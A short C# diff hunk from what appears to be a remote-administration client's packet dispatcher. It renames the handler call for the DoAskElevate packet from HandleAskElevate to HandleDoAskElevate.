@@ -33,7 +33,7 @@ namespace xClient.Core.Packets
             }
             else if (type == typeof(ServerPackets.DoAskElevate))
             {
-                CommandHandler.HandleAskElevate((ServerPackets.DoAskElevate)packet, client);
+                CommandHandler.HandleDoAskElevate((ServerPackets.DoAskElevate)packet, client);
             }
             else if (type == typeof(ServerPackets.GetDesktop))
             {
